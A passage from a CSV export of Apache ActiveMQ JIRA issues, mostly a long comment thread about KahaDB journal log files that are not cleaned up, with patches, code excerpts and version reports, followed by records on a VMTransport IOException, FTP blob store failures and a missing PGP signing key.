",,adrian.trenaman,alisenberg,alsoloplan,artemsakhnov,bezudar,boday,brice,ciand7,cwikman,ee7arh,gtully,jiminoc,jjordan,kokushibyou,m4c0,phil.pickett@springsource.com,shbehna@gmail.com,srpietrowicz,tranchida,treyhyde,vmirea,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5542,,,,,,,,,"24/Sep/10 13:42;m4c0;AMQ-2736.zip;https://issues.apache.org/jira/secure/attachment/12461844/AMQ-2736.zip","08/Oct/10 16:27;gtully;AMQ2736Test_should_with_this_diff.txt;https://issues.apache.org/jira/secure/attachment/12461836/AMQ2736Test_should_with_this_diff.txt","13/Oct/10 17:28;m4c0;MyKahaDBStore.java;https://issues.apache.org/jira/secure/attachment/12461862/MyKahaDBStore.java","08/Oct/10 15:41;jgenender;amq-2987-testcase.patch;https://issues.apache.org/jira/secure/attachment/12461839/amq-2987-testcase.patch","07/Oct/10 18:13;jgenender;amq-2987.patch;https://issues.apache.org/jira/secure/attachment/12461834/amq-2987.patch",,,,,,,,,,,,,,,,,5.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14686,,,Fri Oct 05 12:52:15 UTC 2012,,,,,,,,,,,"0|i00we7:",3180,,,,,,,,,,,,,,,,,,,,,"18/May/10 11:10;gtully;Could you provide a test case or scenario description that can reproduce?;;;","18/May/10 12:16;adrian.trenaman;Hi Gary,

I'm afraid I don't have a test case for this right now; just observed
behaviour on our systems here -and- verified by other users via a Google
Search.

/Ade


;;;","18/May/10 13:17;adrian.trenaman;Hi Gary,

Just retested against the very latest FUSE distribution (5.3.1-fuse-01-00) and the log files are being deleted. Looks like this may have been fixed. Will mark this as resolved for now, and revisit if we begin to see the errors again. 

/Ade;;;","17/Sep/10 06:09;straun;I am seeing this with a broker holding transactional persistent messages (100k messages a day 10k per msg), the queue sizes are all around 0 normally so I would expect the files to be cleared. I am using 5.4.0. The consumer of the messages is a .Net client with 'auto acknowledge' set. The KahaDB also appears to slow down as it runs, writes to the queues slows down so that the each commit cycle is taking 10% longer than the last.;;;","17/Sep/10 08:40;gtully;Straun, can you provide some sort of test case that can reproduce what you are seeing? Maybe a simple java producer/consumer that mimics what your .Net add does.;;;","24/Sep/10 13:42;m4c0;I'm attaching a test case that reproduces what I got here.

I tested with a Producer sending 1mi messages (in 100-message blocks) and a Consumer. After some time, I receive a ""Usage Manager Store is Full, 100% of 1073741824. Stopping producer (...)"" with only a hundred messages on the queue!;;;","07/Oct/10 13:42;jgenender;Looks like there *maybe* a wait/lock condition on multiple ""KahaDB Scheduler"" threads...

I took the attached example and was able to reproduce the problem.  A thread dump showed waits on the ""KahaDB Scheduler"".  I knocked out one of the schedulers and it appears to clean up.

Hence... can you please try setting schedulerSupport=""false"" on the broker configuration and see if the files no longer grow?   This may be a work around for the time being.  Hopefully this is in the right direction...;;;","07/Oct/10 13:49;jgenender;I ran the attached example and was able to reproduce it and indeed appears to endlessly grow.  I did a thread dump during the condition and there appears to be a possible locking problem with multiple ""KahaDB Scheduler"" threads.

As an experiment I killed one of the KahaDB Schedulers and it seemed to clean up.  I ran the example several times and it seems to clean up.  So this *may* be the culprit.

So please try this as a work around...

In the broker configuration set schedulerSupport=""false"" and see if the files clean up.  This may help until we identify the waits on multiple schedulers.;;;","07/Oct/10 13:49;jgenender;I ran the attached example and was able to reproduce it and indeed appears to endlessly grow.  I did a thread dump during the condition and there appears to be a possible locking problem with multiple ""KahaDB Scheduler"" threads.

As an experiment I killed one of the KahaDB Schedulers and it seemed to clean up.  I ran the example several times and it seems to clean up.  So this *may* be the culprit.

So please try this as a work around...

In the broker configuration set schedulerSupport=""false"" and see if the files clean up.  This may help until we identify the waits on multiple schedulers.;;;","07/Oct/10 13:50;jgenender;Oops... sorry for the multiple posts :/;;;","07/Oct/10 18:13;jgenender;My last comment was a red herring.  I found the bug... it s a logic bug.  Patch has been attached.  I will try to create a unit test but wanted to get the patch up since this was a critical bug.;;;","08/Oct/10 12:29;gtully;jeff, committed the fix, thanks. r1005806
await the test case to protect it. nice work.;;;","08/Oct/10 15:41;jgenender;Test case attached;;;","08/Oct/10 16:27;gtully;attaching the diff with the test case and the fix reverted, in which case the test should fail. but it does not atm.
Just so we are on the same page, I may be missing something but I would expect it to fail.;;;","12/Oct/10 11:26;gtully;The scenario that needs to be tested, for future reference:{code}ackMessageFileMap = {2=[1], 3=[1, 2], 4=[2, 3, 4], 5=[4, 5], 6=[5, 6], 7=[6, 7], 8=[7, 8]}

gCandidateSet = [2, 3, 4, 5, 6, 7]{code};;;","13/Oct/10 17:21;m4c0;After some evil debugging tricks, I found that there are some pending inflight transactions (even after restarting the server) in my database files. In this scenario, the gcCandidadeSet is empty, since ""metadata.firstInProgressTransactionLocation"" points to the first log file (MessageDatabase.java, lines 1140-1154):

{code}// Don't GC files after the first in progress tx
Location firstTxLocation = metadata.lastUpdate;
if( metadata.firstInProgressTransactionLocation!=null ) {
  firstTxLocation = metadata.firstInProgressTransactionLocation;
}

if( firstTxLocation!=null ) {
  while( !gcCandidateSet.isEmpty() ) {
    Integer last = gcCandidateSet.last();
    if( last >= firstTxLocation.getDataFileId() ) {
      gcCandidateSet.remove(last);
    } else {
      break;
    }
  }
}
{code}

This leads to the question: why it must discard every log file starting from the one containing the first pending transaction? Any malfunctioning operation (even an one-time little mistake) will trash all log files from that point! 

I believe this should happens also on ""kill -9"" or unexpected power down.;;;","13/Oct/10 17:28;m4c0;I'm attaching a nasty workaround that commits the pending transactions and automatically archives (or deletes) the old log files when closing the store. I'm not proud of this thing, but it seems to prove the problem is on the pending transaction, since all useless files are correctly disposed after running it.;;;","25/Oct/10 06:52;cwikman;I'm using ActiveMQ 5.4.1 in production and I have added Gary's patch, but the log files are stilling growing (even if all queues are empty) and finally Activemq crashes. If I restart ActiveMQ then the log files are deleted. 

Any suggestions on how to fix the problem? ;;;","25/Oct/10 19:00;moczarski;We also had some trouble with growing log files (version 5.4.1). I have two issues identified with similar symptoms (but it seems to be another cause as to this issue):
* AMQ-2982: sticky log files on a rollback of a local transaction (test case and patch available)
* AMQ-2983: sticky log files on multiple concurrent consumers with local transacted sessions (test case available)

If we only use non transacted sessions with auto-acknowledge, we have no problems.;;;","26/Oct/10 08:03;bezudar;@Swen Does using non transacted sessions with auto acknowledge clear the log files?
We have been facing a similar problem, however we are using Kaha Persistence Adapter on upgrading from 5.3.2 to 5.4.1. We had to upgrade to 5.4.1 because earlier using Durable Subs Topics our data files weren't getting cleaned up. Now our index-subs file are creating an issue. 

Any Final fix for this problem?;;;","26/Oct/10 17:16;jgenender;Folks..

Please try the patch supplied above: https://issues.apache.org/activemq/secure/attachment/19715/amq-2987.patch

That appears to fix the problem with the AMQ-2736.zip test.;;;","26/Oct/10 17:26;jgenender;@Christer WIkman - Gary's attachment wasn't a patch... it was a revert to the test case to validate the test case fails.  Please try my patch.;;;","26/Oct/10 23:08;jgenender;Here is the 5.4.1 distribution with the patch in it.  This is *not* an official release... could people please test it out?

http://people.apache.org/~jgenender/apache-activemq-5.4.1-AMQ2736-bin.tar.gz ;;;","27/Oct/10 01:58;tranchida;Do not work for me, same issue.;;;","27/Oct/10 03:22;tranchida;I think that the fix AMQ-2982 must fix also this issue.;;;","27/Oct/10 09:18;dejanb;AMQ-2982 and AMQ-2983 are fixed now on the trunk, so you can test out if that helps. I spotted one more potential issue in the area and I'm working on it now, so stay tuned.;;;","27/Oct/10 13:28;dejanb;That potential issue from the last comment was the false alarm. I believe that this issue should be fixed now. Please test the latest snapshot

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.5-SNAPSHOT/

and reopen if you find any problems.

Thanks;;;","27/Oct/10 14:11;dejanb;Just to wrap it all up, there were three issues spotted;

- one spotted by Jeff and fixed by supplied patch and 
- and two covered by AMQ-2982 and AMQ-2983

Thanks to all who contributed, especially Jeff and Swen;;;","03/Nov/10 09:33;cwikman;We running: http://people.apache.org/~jgenender/apache-activemq-5.4.1-AMQ2736-bin.tar.gz and we are still experience problems with log files that are not deleted. 

I deployed the fix yesterday with a new kahadb and this morning I had 155 log files with only 43 messages on two DLQ queues. I deleted the DLQ queues and only 12 log files where deleted. Currently,. I have 144 log files and nothing in the queues. 


;;;","03/Nov/10 09:40;gtully;Christer, please validate with the 5.5-SNAPSHOT, that has the required combined fixes.
https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.5-SNAPSHOT/;;;","09/Nov/10 07:50;cwikman;I deployed yesterday in stage latest 5.5-SNAPSHOT and it seems that the problem is solved. This morning I had 17 log files, but after I deleted DLQ queues with messages I ended up with only 1 log file! When I used 5.4.1 the files grow with approx 50-100 files per day. 

We are not comfortable deploying 5.5-SNAPSHOT in production. Can anyone provide me with a patch for 5.4.1? Currently, I cannot recommend using version 5.4.1 in production without the combined fixes from 5.5-SNAPSHOT.

;;;","09/Nov/10 17:28;jgenender;@Christer Wlkman - I built one with the following JIRA patches:

http://people.apache.org/~jgenender/apache-activemq-5.4.1-AMQ2736-AMQ2982-AMQ2983-AMQ2935-bin.tar.gz

YMMV and this is not an official release.  Post back if this works for you.;;;","11/Nov/10 09:02;cwikman;@Jeff - Thanks! I have deployed your fix in our stage environment. It works much better but not 100%. All queues are empty but I still have 4 log files and one contains 0 bytes, last updated yesterday, and other log file was last updated 6 hours ago. When I used 5.5-SNAPSHOT it went down to 1 log file!

I will evaluate it for some more days before I can tell for sure if the log files grows. ;;;","16/Nov/10 09:53;cwikman;I have been running Jeff's fix in stage for 5 days and the log files have not grown. I'm now comfortable to use it in production.

Many thanks for all help!
;;;","16/Nov/10 10:07;dejanb;BTW. We released a version of Fuse Message Broker that contains a fix for this issue. If anyone is interested, it can be found here 

http://repo.fusesource.com/nexus/content/repositories/releases/org/apache/activemq/apache-activemq/5.4.1-fuse-01-00/

Release notes available at: http://fusesource.com/wiki/display/ProdInfo/FUSE+Message+Broker+v5.4.1-fuse+Release+Notes;;;","16/Nov/10 13:57;alisenberg;Hi, I really need this fix!!!!. So finally you tested the fix on 5.4.1 or you are going to put 5.5 in production? 

excuse me, but which is the file with the correct patch?

One more question: After applying this fix, would be any way for deleting old log files in order to reduce unused space? I am at 100G and I need to maintain the current state of the broker...

thanks.;;;","16/Nov/10 14:16;cwikman;Use Jeff's patch for 5.4.1, http://people.apache.org/~jgenender/apache-activemq-5.4.1-AMQ2736-AMQ2982-AMQ2983-AMQ2935-bin.tar.gz

I deployed it in production today and it totally removed the problem with growing log files. It went down from 78 log files to just 1 log file. 
;;;","16/Nov/10 20:52;srpietrowicz;I've been trying to track down a solution to a problem similar to this, and the latest snapshot of 5.5 doesn't resolve this for me.

This is the scenario I've created:

1) a producer starts sending messages
2) a consumer starts consuming messages, but pauses after 100.
3) db-##.log files start showing up in the tmp_storage directory as expected.   I let the producer go for a while so a number of db-##.log files are created.
4) the consumer starts consuming messages again. The db-##.log files start disappearing as they're used up.
5) everything finishes.

Now, if I do:

1) a producer starts sending messages
2) a consumer starts consuming messages, but pauses after 100.
3) db-##.log files start showing up in the tmp_storage directory as expected.   I let the producer go for a while so that a number of db-##.log files are created.

and kill the consumer and the producer.  The db-##.log files remain, and will not get cleaned up, even on subsequent invocations of new consumers and producers.  If a new consumer/producer (as in the first scenario) are created, it all works;  it's just that those old .log files never get cleaned up.;;;","06/Jan/11 14:49;jgenender;Steve, I am having difficulty reproducing this... can you please attach a test case?;;;","12/Jan/11 15:28;alisenberg;Hi, is this bug fixed on version 5.4.2? or I need to apply the patch too?

thanks!;;;","12/Jan/11 15:34;straun;5.4.2 does include AMQ-2982 and AMQ-2983, whether this solves all of the issue I am unsure but using 5.4.2 worked for me.;;;","14/Jan/11 19:29;matthewvon;No.  Not fixed in 5.4.2 ... just found that out today.  The hard way.;;;","14/Jan/11 19:38;alisenberg;I think the same. I installed 5.4.2 but still growing. I will rollback to 5.4.1 with patches :(

Thanks;;;","24/Jan/11 17:24;jgreen;Hmm something's not right on our 5.4.2 instance either. A 5GB store reporting itself (after purging some queues) ~89% full. On disk 4.4G. Restarted AMQ it went down to 1.6G and 29% full.;;;","31/Jan/11 09:55;dejanb;Can anyone create a test case, or provide a steps to reproduce the problem with 5.4.2 release? Thanks!;;;","14/Feb/11 15:28;mcekal;Hello Dejan,
We noticed StorageFull on KahaDb several times so I played a little and found two reasons for this (second seems to be a AMQ bug):
1) unconsumed message(s) in any datafile blocks the datafile forever there. So if you keep default setup 33mb per file and 1gb limit roughly 30 small messages spread one to each datafile can block whole system
(I assume this is not a bug, just not nice feature - Why not to reply(=rewrite) messages at least during AMQ restart to latest datafile?)

2) second issue seems to me as a bug. If you open transacted session and send a message, but do not commit it a datafile is blocked. Again if you spread such uncommited messages over all datafiles you gets ""storage is full"". That is ok - someone forget to commit - but problem comes if you kill AMQ using -9 signal (or via TaskManager on Windows). If you do this non-standard kill (=like a hw failure) the uncommited transaction seems to be blocking datafiles forever. New start of AMQ somehow reads again the transaction and still waiting for commit although the producer is not live any more. If you do regular shutdown so ShutdownHook on the Broker is fully executed, next AMQ start correctly recognize whether producer of uncommited transaction (with failover transport) is still up (then transaction is kept, messages are replayed to new/last datafile) or down (then transaction is rollbacked).
I think AMQ should be able to behave this way even if previously someone killed it brutally(kill -9).

I have tested these two scenarios on both 5.3.2 and 5.4.2 with same result. We would like to get a patch for 5.3.2 version. Is it possible?

Thanks a lot
Martin;;;","14/Feb/11 17:50;gtully;@Martin, thanks for the feedback. The second issue is indeed a problem, on normal shutdown, inflight (non xa) transactions are rolledback. The same (rollback) should happen after recovery, to deal with the abortive shutdown case.;;;","17/Feb/11 18:11;gtully;Fixed up abortive shutdown case such that recovered local transactions are auto rolledback.

http://svn.apache.org/viewvc?rev=1071732&view=rev

I think the compact journal data files feature needs another issue.;;;","06/Jun/11 15:51;mcarpella;I am seeing this or a similar issue on a 5.5.0 broker as well, log files are not being deleted. I now deleted all queues, but I am still seeing the checkpoint task ""DEBUG | queue://a.deleted.queue expiring messages .."" in the logs.

I stopped ActiveMQ afterwards and restartet it, after I deleted all queues and still the space being occupied.

During the restart, even after I deleted all queues, I had:
{code}
DEBUG | XA Transaction new/begin : XID:1096044365:3137322e31372e312e352e746d31353531373030333432:3137322e31372e312e352e746d37313330363334
DEBUG | Ack for non existent subscription in recovery, ack:MessageAck {commandId = 66898301, responseRequired = false, ackType = 2, consumerId = ID:CLIENT-001-40008-1306310098527-2:5:10553821:1, firstMessageId = e041a486-8c88-3855-304e-4c9eac0f85b1:0:61129:61129, lastMessageId = e041a486-8c88-3855-304e-4c9eac0f85b1:0:61129:61129, destination = queue://a.deleted.queue, transactionId = XID:1096044365:3137322e31372e312e352e746d31353531373030333432:3137322e31372e312e352e746d37313330363334, messageCount = 1, poisonCause = null}
{code}

After the restart, all the space was still occupied and log-files were never deleted. But at least no more expiry entries for the now deleted queues any more.

KahaDB is 3 according to startup logs. Unfortunately I cannot provide steps to reproduce for 5.5.0 at the moment and the store in question is several GB in size and contains sensitive information I cannot share. 

Should I re-open this issue or a file this as a new issue?;;;","14/Jun/11 17:27;kokushibyou;This does not appear to be fixed in 5.5. 

I have a queue that holds onto a message every once in a while due to bad formatting or what-have-you (not something I can immediately correct). Since KahaDB requires the need to retain the full contents of the DB file while one message persists, it will cause the file system to grow dramatically if you alter the default kahaDB file size at all. With a DB file of 96 megs each I've eaten up almost 5 gigs of disk space in 34 pending messages all less than 2000 bytes each. I'm going to begin auto purging the offending queue (since we don't require those messages), however it would be preferred to have some automatic process possibly automatically consolidate the DB once its reached a pre-configured limit? 
;;;","23/Jun/11 14:02;gtully;Auto consolidation would be a nice enhancement. Can you open a new issue to track that.

As you know, you can also reduce the journal data file size to reduce the overall disk usage in this case.

One other thought, using a camel route, you can easily consume and re-submit messages so that they are moved to the current journal data file. Have a look at the route from the dlq back the the original destination for inspiration. https://issues.apache.org/jira/browse/AMQ-2710. The idea would be to periodically fire a consumer, using quarts, that removes and adds messages. See the test that pulls the original destination from the message.

http://svn.apache.org/viewvc/activemq/trunk/activemq-camel/src/test/resources/org/apache/activemq/camel/CamelRedeliveryTest-context.xml?view=markup
http://svn.apache.org/viewvc/activemq/trunk/activemq-camel/src/test/java/org/apache/activemq/camel/CamelRedeliveryTest.java?view=markup;;;","04/Oct/12 14:37;vmirea;Hi guys,

I am using the version 5.5.1 of ActiveMQ and I can still reproduce this problem.
I saw you have fixed some problems but I think my case is different.
The most connected bug with my issue is :https://issues.apache.org/jira/browse/AMQ-2983

In my case I am no using local transactions, I am using global transaction (XATransactions) and then I always comit the transactions and still the log files are not deleted.
The JMS Connections Pool in my case it is defined in glassfish using the ActiveMQ Resource Adapter.
Have you tested with global transactions too ?
;;;","04/Oct/12 14:58;gtully;@Vasile
If you can reproduce at will, and can provide a tests case, please open a new jira issue to track your use case. Also, validate that your use case fails on trunk using the latest snapshot.;;;","04/Oct/12 15:10;vmirea;I want to add to my previous comment that we are using the CPP library CMS for ActiveMQ with stomp too.
This is the second use-case.
We have one producer and one subscriber and this is already causing problems.
The logs are growing.
In C++ we use Session::AUTO_ACKNOWLEDGE and even in this case the log files are not deleted.
We write(using a producer) in the queue and and another process is reading(using a listener) we never have many messages in the queue.
QueueName       Number of pending messages   Number of listener       Messages Enqueued     Messages Dequeued 
queuename 	0 	                           1 	               21522 	            21522
This is maybe a new use-case too ?;;;","05/Oct/12 12:52;vmirea;I just downloaded the version 5.6.0 of ActiveMQ.
I took the old configuration I was using for 5.5.1 and repeat the tests with my application.
It seems the problems are fixed!
It means the fixed is not made in version 5.5.0 (like the bug is describing).
So please modify the description(Fix Versions field) so the people should know that the version 5.6.0 it contains the fix.
I won't open a new bug because it makes no sense.
;;;"
VMTransport fails with IOException,AMQ-2734,12483667,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,eliebmann,eliebmann,17/May/10 06:32,15/Mar/11 20:58,14/Jul/23 05:43,15/Mar/11 20:58,5.3.0,,,,,,,,Broker,,,,1,,,,,,,,,"We are able to successfully publish a large number of messages to an embedded ActiveMQ instance via the VM protocol/transport. After a while, however, further publishing starts to fail with IOExceptions (caused by InterruptedExceptions). For some (unknown) reason the invocation of LinkedBlockingQueue#put() in the VMTransport#oneway() method starts to fail with InterruptedExceptions. Please find the full stack trace below.

Since we use the VM transport together with the FAILOVER transport the connection is recovered automatically (a fraction of a second later). Our connection URL currently is as follows:

failover:(vm://amqmasterbroker?create=false&amp;waitForStart=10000)?initialReconnectDelay=100&amp;maxReconnectAttempts=5

We intend to set the transport parameters backup=true&timeout=100 on the FAILOVER protocol to work around the problem of stuck publishing threads and message publishing errors in case of the IOException (not sure if this will help) but would want see the root-cause to be fixed by ActiveMQ as this issue is causing a lot of troubles for us in production.

2010-05-14 18:19:13,950 [EventServiceChannel$ReceiverThread[daemon]_357] DEBUG failover.FailoverTransport - Send oneway attempt: 0 failed for command:ActiveMQObjectMessage {commandId = 1929587556, responseRequired = false, messageId = ID:saturntstsgp-40467-1273493117026-2:0:35:2:8847665, originalDestination = null, originalTransactionId = null, producerId = ID:saturntstsgp-40467-127349311702
2010-05-14 18:19:13,950 [EventServiceChannel$ReceiverThread[daemon]_357] WARN  failover.FailoverTransport - Transport failed to vm://amqmasterbroker?create=false&waitForStart=10000 , attempting to automatically reconnect due to: java.io.IOException
2010-05-14 18:19:13,951 [EventServiceChannel$ReceiverThread[daemon]_357] DEBUG failover.FailoverTransport - Transport failed with the following exception:
java.io.IOException
        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45)
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104)
        at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:471)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
        at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1225)
        at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1219)
        at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1680)
        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)
        at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:269)
        at org.springframework.jms.connection.CachedMessageProducer.send(CachedMessageProducer.java:117)
        at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:597)
        at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:574)
        at org.springframework.jms.core.JmsTemplate$3.doInJms(JmsTemplate.java:541)
        at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:471)
        at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:539)
        at com.scb.saturn.services.messagebroker.MessageBrokerImpl.publishMessage(MessageBrokerImpl.java:118)
        at com.scb.saturn.services.messagebroker.MessageBrokerImpl.publishMessage(MessageBrokerImpl.java:102)
        at sun.reflect.GeneratedMethodAccessor38.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.doInvoke(ServiceInvoker.java:64)
        at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.invoke(ServiceInvoker.java:78)
        at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
        at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)
        at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)
        at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
        at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invoke(ServiceTCCLInterceptor.java:36)
        at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
        at org.springframework.osgi.service.importer.support.LocalBundleContextAdvice.invoke(LocalBundleContextAdvice.java:59)
        at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
        at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)
        at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)
        at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
        at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:204)
        at $Proxy45.publishMessage(Unknown Source)
        at com.scb.saturn.services.apamaclient.scenario.ScenarioService.publishToMessageBroker(ScenarioService.java:362)
        at com.scb.saturn.services.apamaclient.scenario.ScenarioService.updateInstance(ScenarioService.java:97)
        at com.scb.saturn.services.apamaclient.scenario.ScenarioService.propertyChange(ScenarioService.java:176)
        at java.beans.PropertyChangeSupport.firePropertyChange(Unknown Source)
        at java.beans.PropertyChangeSupport.firePropertyChange(Unknown Source)
        at com.apama.services.scenario.internal.ScenarioDefinition.handle_instanceUpdated(ScenarioDefinition.java:1424)
        at com.apama.services.scenario.internal.ScenarioDefinition.access$300(ScenarioDefinition.java:52)
        at com.apama.services.scenario.internal.ScenarioDefinition$2.handleEvent(ScenarioDefinition.java:1627)
        at com.apama.services.event.internal.EventServiceChannel.processEvent(EventServiceChannel.java:1057)
        at com.apama.services.event.internal.EventServiceChannel$ReceiverThread.run(EventServiceChannel.java:1179)
Caused by: java.lang.InterruptedException
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireInterruptibly(Unknown Source)
        at java.util.concurrent.locks.ReentrantLock.lockInterruptibly(Unknown Source)
        at java.util.concurrent.LinkedBlockingQueue.put(Unknown Source)
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:94)
        ... 44 more
2010-05-14 18:19:13,960 [EventServiceChannel$ReceiverThread[daemon]_357] WARN  util.LoggingTransportListener - transport [amqMessageBrokerAmqConnectionTransport] has been interrupted
2010-05-14 18:19:13,961 [ActiveMQ Task] DEBUG failover.FailoverTransport - urlList connectionList:[vm://amqmasterbroker?create=false&waitForStart=10000]
2010-05-14 18:19:13,961 [ActiveMQ Task] DEBUG failover.FailoverTransport - Attempting connect to: vm://amqmasterbroker?create=false&waitForStart=10000
2010-05-14 18:19:13,962 [ActiveMQ Task] DEBUG failover.FailoverTransport - Connection established
2010-05-14 18:19:13,962 [ActiveMQ Task] WARN  util.LoggingTransportListener - transport [amqMessageBrokerAmqConnectionTransport] has been resumed
2010-05-14 18:19:14,025 [ActiveMQ Task] INFO  failover.FailoverTransport - Successfully reconnected to vm://amqmasterbroker?create=false&waitForStart=10000","OS: Linux / 2.6.9-67.ELsmp / i386 / 8
JVM: Java HotSpot(TM) Server VM / Sun Microsystems Inc. / 1.6.0_17-b04",aravind,eliebmann,shafina,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/May/10 06:34;eliebmann;VMTransport_IOException.txt;https://issues.apache.org/jira/secure/attachment/12461698/VMTransport_IOException.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74822,,,Tue Mar 15 20:58:12 UTC 2011,,,,,,,,,,,"0|i0tsm7:",171945,,,,,,,,,,,,,,,,,,,,,"17/May/10 06:34;eliebmann;the full stacktrace and associated reconnection logs;;;","19/May/10 02:32;eliebmann;Forgot to mention that we amended the FailoverTransport#handleTransportFailure() method to capture the full stack trace (could probably have been done with AOP or BTrace as well). Would appreciate if someone could look into this.;;;","20/Jan/11 00:48;shafina;Is the fix available in 5.4.2? 

After getting this exception gets Session closed exception if we try to sent message as shown below

Jan 13 15:26:28 127.0.0.1 aused by: javax.jms.IllegalStateException: The Session is closed Jan 13 15:26:28 127.0.0.1 at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:722)
Jan 13 15:26:28 127.0.0.1 at org.apache.activemq.ActiveMQSession.createProducer(ActiveMQSession.java:922)

Is there any specific reason for session being closed after java.lang.InterruptedException ?
;;;","15/Mar/11 20:58;tabish;Fixes in the VM Transport in 5.5.0 should resolve this issue, reopen if the problem reoccurs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FTP Blob send should fail if file store fails,AMQ-2732,12483282,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,13/May/10 15:33,13/May/10 15:41,14/Jul/23 05:43,13/May/10 15:41,5.3.2,,,,,5.4.0,,,,,,,0,,,,,,,,,Currently we don't check whether storing a file on the server succeeds or not.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74823,,,Thu May 13 15:41:18 UTC 2010,,,,,,,,,,,"0|i0rqhj:",159935,,,,,,,,,,,,,,,,,,,,,"13/May/10 15:41;dejanb;Resolved with svn revision 943916. Incidentally I refactored FTP related tests to be better organized and to properly set write access on the test ftp server. More changes to come.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PGP Signature does not validate. The signing key is not located in the KEYS.txt,AMQ-2731,12483770,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,aletheia7,aletheia7,13/May/10 00:52,05/Mar/11 05:48,14/Jul/23 05:43,05/Mar/11 05:48,5.3.2,,,,,5.3.2,,,,,,,0,,,,,,,,,"The signing key for apache-activemq-5.3.2-bin.tar.gz is not located in the KEYS.txt. The SHA1 hash does verify!

According to the website: http://activemq.apache.org/activemq-532-release.html, the following commands should verify the signature of apache-activemq-5.3.2-bin.tar.gz.

$ gpg --import KEYS.txt
$ gpg --verify apache-activemq-5.3.2-bin.tar.gz.asc

Here is the output:
$ gpg --import KEYS.txt
gpg: key F5BA7E4F: ""Hiram Chirino <hiram@hiramchirino.com>"" not changed
gpg: key 56F3E01B: ""David Jencks (geronimo) <david_jencks@yahoo.com>"" not changed
gpg: key 456DFEA9: ""David M. Johnson (Dave Johnson) <snoopdave@apache.org>"" not changed
gpg: key 17AA5B25: ""David Johnson <snoopdave@apache.org>"" not changed
